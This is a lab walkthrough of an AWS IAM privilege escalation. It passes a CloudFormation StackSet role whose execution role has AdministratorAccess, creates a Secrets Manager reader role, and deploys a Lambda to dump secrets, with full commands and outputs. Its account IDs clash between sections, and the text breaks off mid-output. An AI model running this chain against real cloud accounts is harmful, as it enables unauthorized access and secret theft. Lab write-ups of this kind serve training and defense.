---
platform: HackSmarter
difficulty: Hard
category: AWS
title: "Hack Smarter: Stacked — AWS IAM Privilege Escalation"
description: "A walkthrough of escalating from a developer IAM policy through CloudFormation StackSets to retrieve a secret in the Hack Smarter AWS lab."
pubDate: 2026-11-12
readTime: "13 min read"
tags: ["Hack Smarter", "AWS", "IAM", "Privilege Escalation"]
featured: false
---
## Summary

The `cg_dev_lab` IAM policy restricts direct privilege changes, but still allows actions such as `iam:PassRole`, Lambda creation, and CloudFormation StackSet deployment. By passing the StackSet administration role, whose execution role has `AdministratorAccess`, the developer can use CloudFormation to create a Lambda role with Secrets Manager read access, then invoke it to retrieve the lab secret.

## Table of Contents

- [Whois cg_dev_lab?](#whois-cg_dev_lab)
- [Dump all user, roles, policies, groups](#dump-all-user-roles-policies-groups)
- [cg_dev_policy_lab - developer policy](#cg_dev_policy_lab---developer-policy)
- [StackSets privilege escalation](#stacksets-privilege-escalation)
  - [Enumerate the StackSet role permissions](#enumerate-the-stackset-role-permissions)
  - [Deploy the StackSets privilege escalation](#deploy-the-stacksets-privilege-escalation)
    - [Why this escalation works](#why-this-escalation-works)
    - [Create a CloudFormation template](#create-a-cloudformation-template)
    - [Create a self-managed StackSet](#create-a-self-managed-stackset)
    - [Deploy a StackSet instance](#deploy-a-stackset-instance)
    - [Verify that CloudFormation created the role](#verify-that-cloudformation-created-the-role)
    - [Retrieve the lab secret](#retrieve-the-lab-secret)

# Whois cg_dev_lab?
Life's greatest question, "whoami?":
```bash
aws sts get-caller-identity --profile stacked
```

Expected output:
```json
{
    "UserId": "AIDAWYE7LSQ6XGBNGQVHN",
    "Account": "464190673981",
    "Arn": "arn:aws:iam::464190673981:user/cg_dev_lab"
}
```

List the attached user policies:
```bash
aws iam list-attached-user-policies --user-name cg_dev_lab --profile stacked
```

Expected output:
```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "cg_dev_policy_lab",
            "PolicyArn": "arn:aws:iam::464190673981:policy/cg_dev_policy_lab"
        }
    ]
}
```

# Dump all user, roles, policies, groups
Pacu is just faster when opsec isn't necessary.
```bash
Pacu (stacked:imported-stacked) > run iam__enum_users_roles_policies_groups
```

Expected output:
```
  Running module iam__enum_users_roles_policies_groups...
[iam__enum_users_roles_policies_groups] Found 1 users
[iam__enum_users_roles_policies_groups] Found 27 roles
[iam__enum_users_roles_policies_groups] Found 1 policies
[iam__enum_users_roles_policies_groups] Found 0 groups
[iam__enum_users_roles_policies_groups] iam__enum_users_roles_policies_groups completed.

[iam__enum_users_roles_policies_groups] MODULE SUMMARY:

  1 Users Enumerated
  27 Roles Enumerated
  1 Policies Enumerated
  0 Groups Enumerated
  IAM resources saved in Pacu database.
```

List the retrieved data:
```bash
Pacu (stacked:imported-stacked) > data iam
```

Expected output:
```json
{
  "Groups": [],
  "Policies": [
    {
      "Arn": "arn:aws:iam::464190673981:policy/cg_dev_policy_lab",
      "AttachmentCount": 1,
      "CreateDate": "Thu, 12 Nov 2026 14:40:29",
      "DefaultVersionId": "v1",
      "IsAttachable": true,
      "Path": "/",
      "PermissionsBoundaryUsageCount": 0,
      "PolicyId": "ANPAWYE7LSQ6TDTLRRF3F",
      "PolicyName": "cg_dev_policy_lab",
      "UpdateDate": "Thu, 12 Nov 2026 14:40:29"
    }
  ],
  "Roles": [
    {
      "Arn": "arn:aws:iam::464190673981:role/AWSCloudFormationStackSetAdministrationRole-lab",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "Service": "cloudformation.amazonaws.com"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "CreateDate": "Thu, 12 Nov 2026 14:40:29",
      "MaxSessionDuration": 3600,
      "Path": "/",
      "RoleId": "AROAWYE7LSQ64T2AE5IZU",
      "RoleName": "AWSCloudFormationStackSetAdministrationRole-lab"
    },
    {
      "Arn": "arn:aws:iam::464190673981:role/AWSCloudFormationStackSetExecutionRole-lab",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "AWS": "arn:aws:iam::464190673981:role/AWSCloudFormationStackSetAdministrationRole-lab"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "CreateDate": "Thu, 12 Nov 2026 14:40:55",
      "MaxSessionDuration": 3600,
      "Path": "/",
      "RoleId": "AROAWYE7LSQ6SNFG7OSXG",
      "RoleName": "AWSCloudFormationStackSetExecutionRole-lab"
    },
    {
      "Arn": "arn:aws:iam::464190673981:role/aws-service-role/organizations.amazonaws.com/AWSServiceRoleForOrganizations",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "Service": "organizations.amazonaws.com"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "CreateDate": "Thu, 16 Jul 2026 20:54:40",
      "Description": "Service-linked role used by AWS Organizations to enable integration of other AWS services with Organizations.",
      "MaxSessionDuration": 3600,
      "Path": "/aws-service-role/organizations.amazonaws.com/",
      "RoleId": "AROAWYE7LSQ6T6HAOWASQ",
      "RoleName": "AWSServiceRoleForOrganizations"
    },
    {
      "Arn": "arn:aws:iam::464190673981:role/aws-service-role/support.amazonaws.com/AWSServiceRoleForSupport",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "Service": "support.amazonaws.com"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "CreateDate": "Thu, 16 Jul 2026 20:54:39",
      "Description": "Enables resource access for AWS to provide billing, administrative and support services",
      "MaxSessionDuration": 3600,
      "Path": "/aws-service-role/support.amazonaws.com/",
      "RoleId": "AROAWYE7LSQ62IWWPKGOK",
      "RoleName": "AWSServiceRoleForSupport"
    },
    {
      "Arn": "arn:aws:iam::464190673981:role/aws-service-role/trustedadvisor.amazonaws.com/AWSServiceRoleForTrustedAdvisor",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "Service": "trustedadvisor.amazonaws.com"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "CreateDate": "Thu, 16 Jul 2026 20:54:39",
      "Description": "Access for the AWS Trusted Advisor Service to help reduce cost, increase performance, and improve security of your AWS environment.",
      "MaxSessionDuration": 3600,
      "Path": "/aws-service-role/trustedadvisor.amazonaws.com/",
      "RoleId": "AROAWYE7LSQ6WERGZQLWG",
      "RoleName": "AWSServiceRoleForTrustedAdvisor"
    },
    {
      "Arn": "arn:aws:iam::464190673981:role/cg-apigw-logger-lab",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "Service": "apigateway.amazonaws.com"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "CreateDate": "Thu, 12 Nov 2026 14:40:29",
      "MaxSessionDuration": 3600,
      "Path": "/",
      "RoleId": "AROAWYE7LSQ67GTCXJXSA",
      "RoleName": "cg-apigw-logger-lab"
    },
    {
      "Arn": "arn:aws:iam::464190673981:role/cg-cloudtrail-role-lab",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "Service": "cloudtrail.amazonaws.com"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "CreateDate": "Thu, 12 Nov 2026 14:40:29",
      "MaxSessionDuration": 3600,
      "Path": "/",
      "RoleId": "AROAWYE7LSQ63KODWJ3MS",
      "RoleName": "cg-cloudtrail-role-lab"
    },
    {
      "Arn": "arn:aws:iam::464190673981:role/cg-codebuild-admin-lab",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "Service": "codebuild.amazonaws.com"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "CreateDate": "Thu, 12 Nov 2026 14:40:29",
      "MaxSessionDuration": 3600,
      "Path": "/",
      "RoleId": "AROAWYE7LSQ6RCN2OS3QS",
      "RoleName": "cg-codebuild-admin-lab"
    },
    {
      "Arn": "arn:aws:iam::464190673981:role/cg-codepipeline-admin-lab",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "Service": "codepipeline.amazonaws.com"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "CreateDate": "Thu, 12 Nov 2026 14:40:29",
      "MaxSessionDuration": 3600,
      "Path": "/",
      "RoleId": "AROAWYE7LSQ67GQNBNDOE",
      "RoleName": "cg-codepipeline-admin-lab"
    },
    {
      "Arn": "arn:aws:iam::464190673981:role/cg-ec2-admin-role-lab",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "Service": "ec2.amazonaws.com"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "CreateDate": "Thu, 12 Nov 2026 14:40:29",
      "MaxSessionDuration": 3600,
      "Path": "/",
      "RoleId": "AROAWYE7LSQ6S3TVIEC7K",
      "RoleName": "cg-ec2-admin-role-lab"
    },
    {
      "Arn": "arn:aws:iam::464190673981:role/cg-ecs-task-admin-lab",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "Service": "ecs-tasks.amazonaws.com"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "CreateDate": "Thu, 12 Nov 2026 14:40:29",
      "MaxSessionDuration": 3600,
      "Path": "/",
      "RoleId": "AROAWYE7LSQ6QB3ISICL6",
      "RoleName": "cg-ecs-task-admin-lab"
    },
    {
      "Arn": "arn:aws:iam::464190673981:role/cg-eks-cluster-role-lab",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "Service": "eks.amazonaws.com"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "CreateDate": "Thu, 12 Nov 2026 14:40:29",
      "MaxSessionDuration": 3600,
      "Path": "/",
      "RoleId": "AROAWYE7LSQ6VBN43SBQG",
      "RoleName": "cg-eks-cluster-role-lab"
    },
    {
      "Arn": "arn:aws:iam::464190673981:role/cg-elasticbeanstalk-admin-lab",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "Service": "elasticbeanstalk.amazonaws.com"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "CreateDate": "Thu, 12 Nov 2026 14:40:29",
      "MaxSessionDuration": 3600,
      "Path": "/",
      "RoleId": "AROAWYE7LSQ65YG6HQFTH",
      "RoleName": "cg-elasticbeanstalk-admin-lab"
    },
    {
      "Arn": "arn:aws:iam::464190673981:role/cg-events-invoke-lab",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "Service": "events.amazonaws.com"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "CreateDate": "Thu, 12 Nov 2026 14:40:29",
      "MaxSessionDuration": 3600,
      "Path": "/",
      "RoleId": "AROAWYE7LSQ64HON7OE5E",
      "RoleName": "cg-events-invoke-lab"
    },
    {
      "Arn": "arn:aws:iam::464190673981:role/cg-glue-admin-lab",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "Service": "glue.amazonaws.com"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "CreateDate": "Thu, 12 Nov 2026 14:40:29",
      "MaxSessionDuration": 3600,
      "Path": "/",
      "RoleId": "AROAWYE7LSQ6WGQHAZZJ5",
      "RoleName": "cg-glue-admin-lab"
    },
    {
      "Arn": "arn:aws:iam::464190673981:role/cg-lambda-dynamo-reader-lab",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "Service": "lambda.amazonaws.com"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "CreateDate": "Thu, 12 Nov 2026 14:40:29",
      "MaxSessionDuration": 3600,
      "Path": "/",
      "RoleId": "AROAWYE7LSQ6TSMTC3MEH",
      "RoleName": "cg-lambda-dynamo-reader-lab"
    },
    {
      "Arn": "arn:aws:iam::464190673981:role/cg-lambda-restricted-admin-lab",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "Service": "lambda.amazonaws.com"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "CreateDate": "Thu, 12 Nov 2026 14:40:29",
      "MaxSessionDuration": 3600,
      "Path": "/",
      "RoleId": "AROAWYE7LSQ6YJWY23TB2",
      "RoleName": "cg-lambda-restricted-admin-lab"
    },
    {
      "Arn": "arn:aws:iam::464190673981:role/cg-lambda-s3-reader-lab",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "Service": "lambda.amazonaws.com"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "CreateDate": "Thu, 12 Nov 2026 14:40:29",
      "MaxSessionDuration": 3600,
      "Path": "/",
      "RoleId": "AROAWYE7LSQ6WPGXFM5KR",
      "RoleName": "cg-lambda-s3-reader-lab"
    },
    {
      "Arn": "arn:aws:iam::464190673981:role/cg-pipes-basic-lab",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "Service": "pipes.amazonaws.com"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "CreateDate": "Thu, 12 Nov 2026 14:40:29",
      "MaxSessionDuration": 3600,
      "Path": "/",
      "RoleId": "AROAWYE7LSQ6ZEQO5ZUSH",
      "RoleName": "cg-pipes-basic-lab"
    },
    {
      "Arn": "arn:aws:iam::464190673981:role/cg-rds-monitoring-lab",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "Service": "monitoring.rds.amazonaws.com"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "CreateDate": "Thu, 12 Nov 2026 14:40:29",
      "MaxSessionDuration": 3600,
      "Path": "/",
      "RoleId": "AROAWYE7LSQ6UOAZ5FCOM",
      "RoleName": "cg-rds-monitoring-lab"
    },
    {
      "Arn": "arn:aws:iam::464190673981:role/cg-redshift-admin-lab",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "Service": "redshift.amazonaws.com"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "CreateDate": "Thu, 12 Nov 2026 14:40:29",
      "MaxSessionDuration": 3600,
      "Path": "/",
      "RoleId": "AROAWYE7LSQ6ZLAR6S4K3",
      "RoleName": "cg-redshift-admin-lab"
    },
    {
      "Arn": "arn:aws:iam::464190673981:role/cg-sagemaker-admin-lab",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "Service": "sagemaker.amazonaws.com"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "CreateDate": "Thu, 12 Nov 2026 14:40:29",
      "MaxSessionDuration": 3600,
      "Path": "/",
      "RoleId": "AROAWYE7LSQ65HCXGFRRQ",
      "RoleName": "cg-sagemaker-admin-lab"
    },
    {
      "Arn": "arn:aws:iam::464190673981:role/cg-scheduler-basic-lab",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "Service": "scheduler.amazonaws.com"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "CreateDate": "Thu, 12 Nov 2026 14:40:29",
      "MaxSessionDuration": 3600,
      "Path": "/",
      "RoleId": "AROAWYE7LSQ6RKYIXTQTL",
      "RoleName": "cg-scheduler-basic-lab"
    },
    {
      "Arn": "arn:aws:iam::464190673981:role/cg-ssm-maintenance-lab",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "Service": "ssm.amazonaws.com"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "CreateDate": "Thu, 12 Nov 2026 14:40:29",
      "MaxSessionDuration": 3600,
      "Path": "/",
      "RoleId": "AROAWYE7LSQ6UQKSUZUB4",
      "RoleName": "cg-ssm-maintenance-lab"
    },
    {
      "Arn": "arn:aws:iam::464190673981:role/cg-states-monitor-lab",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "Service": "states.amazonaws.com"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "CreateDate": "Thu, 12 Nov 2026 14:40:29",
      "MaxSessionDuration": 3600,
      "Path": "/",
      "RoleId": "AROAWYE7LSQ6TOWXTV4WO",
      "RoleName": "cg-states-monitor-lab"
    },
    {
      "Arn": "arn:aws:iam::464190673981:role/CourseStackAwsLabRole",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "AWS": "arn:aws:iam::662863940582:role/CourseStackAwsLabControlPlane"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "CreateDate": "Thu, 16 Jul 2026 20:54:49",
      "Description": "CourseStack AWS Cloud Lab deploy/nuke role",
      "MaxSessionDuration": 3600,
      "Path": "/",
      "RoleId": "AROAWYE7LSQ6WDZE7XDMC",
      "RoleName": "CourseStackAwsLabRole"
    },
    {
      "Arn": "arn:aws:iam::464190673981:role/OrganizationAccountAccessRole",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "AWS": "arn:aws:iam::992382618926:root"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "CreateDate": "Thu, 16 Jul 2026 20:54:39",
      "MaxSessionDuration": 3600,
      "Path": "/",
      "RoleId": "AROAWYE7LSQ6Q4OGKAILA",
      "RoleName": "OrganizationAccountAccessRole"
    }
  ],
  "Users": [
    {
      "Arn": "arn:aws:iam::464190673981:user/cg_dev_lab",
      "CreateDate": "Thu, 12 Nov 2026 14:40:29",
      "Path": "/",
      "UserId": "AIDAWYE7LSQ6XGBNGQVHN",
      "UserName": "cg_dev_lab"
    }
  ]
}
```
# cg_dev_policy_lab - developer policy
Retrieve the developer's policy by version using `get-policy-version`:
```bash
aws iam get-policy-version \
  --policy-arn arn:aws:iam::464190673981:policy/cg_dev_policy_lab \
  --version-id v1 \
  --query 'PolicyVersion.Document' \
  --output json \
  --profile stacked
```

Expected output:
```json
{
    "Statement": [
        {
            "Action": [
                "s3:Get*",
                "s3:List*",
                "s3:Describe*",
                "s3-object-lambda:Get*",
                "s3-object-lambda:List*",
                "s3:CreateBucket",
                "s3:PutObject",
                "s3:GetBucketVersioning",
                "s3:GetBucketTagging",
                "s3:GetEncryptionConfiguration",
                "s3:GetBucketNotification",
                "sns:*",
                "dynamodb:ListGlobalTables",
                "dynamodb:Scan",
                "dynamodb:ListTables",
                "dynamodb:ListImports",
                "dynamodb:DescribeEndpoints",
                "dynamodb:DescribeStream",
                "dynamodb:DescribeTable",
                "dynamodb:DescribeTimeToLive",
                "dynamodb:ListStreams",
                "dynamodb:BatchWriteItem",
                "dynamodb:CreateGlobalTable",
                "dynamodb:CreateTable",
                "dynamodb:CreateTableReplica",
                "dynamodb:DeleteItem",
                "dynamodb:ImportTable",
                "dynamodb:PartiQLInsert",
                "dynamodb:PartiQLUpdate",
                "dynamodb:PutItem",
                "dynamodb:UpdateItem",
                "dynamodb:UpdateTable",
                "dynamodb:UpdateTimeToLive",
                "dynamodb:PartiQLSelect",
                "sqs:CreateQueue",
                "sqs:GetQueueAttributes",
                "sqs:GetQueueUrl",
                "sqs:ListDeadLetterSourceQueues",
                "sqs:ListQueues",
                "sqs:ListMessageMoveTasks",
                "sqs:ReceiveMessage",
                "sqs:DeleteMessage",
                "sqs:GetQueueAttributes",
                "logs:*",
                "execute-api:Invoke",
                "execute-api:ManageConnections",
                "cloudformation:*",
                "iam:*",
                "wafv2:*",
                "lambda:*",
                "ec2:Describe*",
                "ec2:List*",
                "apigateway:*",
                "cloudwatch:*",
                "textract:*",
                "comprehend:*",
                "comprehendmedical:*",
                "states:List*",
                "states:StartExecution",
                "states:Create*",
                "states:StopExecution",
                "states:Describe*",
                "states:GetExecution*",
                "xray:BatchGet*",
                "xray:Get*",
                "pipes:*",
                "scheduler:*",
                "kms:ListAliases",
                "kms:ListKeys",
                "kms:DescribeKey",
                "kms:Decrypt",
                "kms:Encrypt",
                "kms:GenerateRandom"
            ],
            "Effect": "Allow",
            "Resource": "*",
            "Sid": "Automation"
        },
        {
            "Action": [
                "iam:Create*",
                "iam:Delete*",
                "iam:Remove*",
                "iam:Update*",
                "iam:Attach*",
                "iam:Put*",
                "iam:Add*",
                "iam:Set*"
            ],
            "Effect": "Deny",
            "Resource": "*",
            "Sid": "stopiamprivesc"
        },
        {
            "Action": [
                "s3:PutAccountPublicAccessBlock",
                "s3:PutBucketPublicAccessBlock",
                "s3:DeleteBucket"
            ],
            "Effect": "Deny",
            "Resource": "*",
            "Sid": "DenyS3PublicAccess"
        }
    ],
    "Version": "2012-10-17"
}
```

The policy reveals a viable privilege-escalation mechanism: unrestricted `iam:PassRole` combined with `lambda:*` and `cloudformation:*`

The developer's IAM restrictions are much less effective than they initially appear.

| Permission                      | Effective access  |
| ------------------------------- | ----------------- |
| `iam:PassRole`                  | Allowed           |
| `lambda:CreateFunction`         | Allowed           |
| `lambda:InvokeFunction`         | Allowed           |
| `cloudformation:CreateStack`    | Allowed           |
| `iam:AttachRolePolicy`          | Explicitly denied |
| `iam:CreatePolicyVersion`       | Explicitly denied |
| `secretsmanager:GetSecretValue` | Not granted       |
| `sts:AssumeRole`                | Not granted       |
`stopiamprivesc` statement denies IAM operations beginning with `Create`, `Delete`, `Remove`, `Update`, `Attach`, `Put`, `Add`, and `Set`. However, `iam:PassRole` does not match any of those patterns, so the original `iam:*` allow still applies.

AWS documents this as a privilege-escalation risk when the roles a principal can pass are not appropriately restricted.
## StackSets privilege escalation
### Enumerate the StackSet role permissions
AWS's standard self-managed StackSet design uses an administration role to assume an execution role. The execution role can have broad resource-creation permissions, including administrator access in AWS's example configuration. https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/stacksets-prereqs-self-managed.html

Retrieve all role policies, their permissions boundary, and `AssumeRole` trust for both StackSet roles:
```bash
for role in \
  AWSCloudFormationStackSetAdministrationRole-lab \
  AWSCloudFormationStackSetExecutionRole-lab
do
    echo "===== $role ====="

    aws iam list-attached-role-policies \
      --role-name "$role" \
      --profile stacked

    aws iam list-role-policies \
      --role-name "$role" \
      --profile stacked

    aws iam get-role \
      --role-name "$role" \
      --query 'Role.{PermissionsBoundary:PermissionsBoundary,Trust:AssumeRolePolicyDocument}' \
      --profile stacked
done
```

Expected output:
```json
===== AWSCloudFormationStackSetAdministrationRole-lab =====
{
    "AttachedPolicies": []
}

{
    "PolicyNames": [
        "AssumeExecutionRole"
    ]
}

{
    "PermissionsBoundary": null,
    "Trust": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Principal": {
                    "Service": "cloudformation.amazonaws.com"
                },
                "Action": "sts:AssumeRole"
            }
        ]
    }
}
```

```json
===== AWSCloudFormationStackSetExecutionRole-lab =====
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}

{
    "PolicyNames": []
}

{
    "PermissionsBoundary": null,
    "Trust": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Principal": {
                    "AWS": "arn:aws:iam::464190673981:role/AWSCloudFormationStackSetAdministrationRole-lab"
                },
                "Action": "sts:AssumeRole"
            }
        ]
    }
}
```

`AssumeExecutionRole` is an inline IAM policy attached to `AWSCloudFormationStackSetAdministrationRole-lab`.

Inspect it using `get-role-policy`:
```bash
aws iam get-role-policy \
  --role-name AWSCloudFormationStackSetAdministrationRole-lab \
  --policy-name AssumeExecutionRole \
  --query 'PolicyDocument' \
  --output json \
  --profile stacked
```

Expected output:
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Resource": "arn:aws:iam::528081867510:role/AWSCloudFormationStackSetExecutionRole-lab"
        }
    ]
}
```

### Deploy the StackSets privilege escalation
#### Why this escalation works

The underlying weakness is not `AdministratorAccess` alone. It's the combination of:

1. A low-privileged developer allowed to create CloudFormation StackSets.
    
2. Unrestricted `iam:PassRole`.
    
3. A CloudFormation administration role capable of assuming a privileged StackSet execution role.
    
4. An execution role with unrestricted `AdministratorAccess`.
    
The developer's explicit IAM deny is bypassed indirectly through a different principal's permissions, not overridden or removed.
#### Create a CloudFormation template
This template creates a new Lambda execution role with the permissions needed to read Secrets Manager secrets. It doesn't modify the developer's policy. Instead, CloudFormation creates a new role through its privileged execution identity.
```bash
cat > stackset-role.yml <<'YAML'
AWSTemplateFormatVersion: '2010-09-09'
Description: AWS lab privilege escalation

Resources:
  SecretsReaderRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName: cg-stackset-secrets-reader-lab
      AssumeRolePolicyDocument:
        Version: '2012-10-17'
        Statement:
          - Effect: Allow
            Principal:
              Service: lambda.amazonaws.com
            Action: sts:AssumeRole
      ManagedPolicyArns:
        - arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole
      Policies:
        - PolicyName: ReadLabSecrets
          PolicyDocument:
            Version: '2012-10-17'
            Statement:
              - Effect: Allow
                Action:
                  - secretsmanager:ListSecrets
                  - secretsmanager:GetSecretValue
                Resource: '*'
              - Effect: Allow
                Action: kms:Decrypt
                Resource: '*'
YAML
```

#### Create a self-managed StackSet
The explicit administration and execution role arguments are important because custom role names are used instead of AWS's defaults.
```bash
export REGION=$(aws configure get region --profile stacked)
export ACCOUNT=528081867510

# Ensure REGION is set to the lab's AWS Region.
echo "$REGION"

aws cloudformation create-stack-set \
  --stack-set-name cg-escalation-lab \
  --permission-model SELF_MANAGED \
  --administration-role-arn \
    "arn:aws:iam::${ACCOUNT}:role/AWSCloudFormationStackSetAdministrationRole-lab" \
  --execution-role-name AWSCloudFormationStackSetExecutionRole-lab \
  --template-body file://stackset-role.yml \
  --capabilities CAPABILITY_NAMED_IAM \
  --region "$REGION" \
  --profile stacked
```

```json
{
    "StackSetId": "cg-escalation-lab:1fd93072-05f4-4ec1-b030-6b24ea90a1e4"
}
```
#### Deploy a StackSet instance
This returns an `OperationId`.
```bash
aws cloudformation create-stack-instances \
  --stack-set-name cg-escalation-lab \
  --accounts "$ACCOUNT" \
  --regions "$REGION" \
  --region "$REGION" \
  --profile stacked
```

Expected output:
```json
{
    "OperationId": "0c9585fe-84ec-465f-9800-ff9bc6433081"
}
```

Check the operation:
```bash
aws cloudformation describe-stack-set-operation \
  --stack-set-name cg-escalation-lab \
  --operation-id 0c9585fe-84ec-465f-9800-ff9bc6433081 \
  --region "$REGION" \
  --profile stacked \
  --query 'StackSetOperation.{Status:Status,Reason:StatusReason}'
```

Exected output:
```json
{
    "Status": "SUCCEEDED",
    "Reason": null
}
```
> Wait until the status is `SUCCEEDED`. If it fails, inspect `list-stack-set-operation-results` for the individual stack instance failure.
#### Verify that CloudFormation created the role
This demonstrates the crucial escalation: the developer identity could not call `iam:CreateRole` directly, but it could initiate a CloudFormation operation that created the role under a different execution identity.
```bash
aws iam get-role \
  --role-name cg-stackset-secrets-reader-lab \
  --query 'Role.Arn' \
  --output text \
  --profile stacked
```

Expected output:
```json
arn:aws:iam::528081867510:role/cg-stackset-secrets-reader-lab
```
#### Retrieve the lab secret
The existing `lambda:*` permission is used to create a Lambda function running under the newly created Secrets Manager reader role.
```bash
cat > lambda_function.py <<'PY'
import boto3

def lambda_handler(event, context):
    sm = boto3.client("secretsmanager")

    if "secret_id" not in event:
        return {
            "secrets": [
                s["Name"]
                for page in sm.get_paginator("list_secrets").paginate()
                for s in page["SecretList"]
            ]
        }

    result = sm.get_secret_value(
        SecretId=event["secret_id"]
    )

    return {
        "secret": result.get("SecretString"),
        "secret_binary": result.get("SecretBinary")
    }
PY

zip function.zip lambda_function.py

aws lambda create-function \
  --function-name cg-secrets-reader-lab \
  --runtime python3.12 \
  --handler lambda_function.lambda_handler \
  --role "arn:aws:iam::${ACCOUNT}:role/cg-stackset-secrets-reader-lab" \
  --zip-file fileb://function.zip \
  --timeout 30 \
  --region "$REGION" \
  --profile stacked
```

Expected output:
```json
{
    "FunctionName": "cg-secrets-reader-lab",
    "FunctionArn": "arn:aws:lambda:us-east-1:528081867510:function:cg-secrets-reader-lab",
    "Runtime": "python3.12",
    "Role": "arn:aws:iam::528081867510:role/cg-stackset-secrets-reader-lab",
    "Handler": "lambda_function.lambda_handler",
    "CodeSize": 438,
    "Description": "",
    "Timeout": 30,
    "MemorySize": 128,
    "LastModified": "2026-11-12T16:23:21.182+0000",
    "CodeSha256": "HS4ZtmwlVFKjGVLO/BO/zS0YprTGl+/bDBUuNM7fIUw=",
    "Version": "$LATEST",
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "8571d5b8-e5d0-4ce2-9d81-5fdca3829c8d",
    "State": "Pending",
    "StateReason": "The function is being created.",
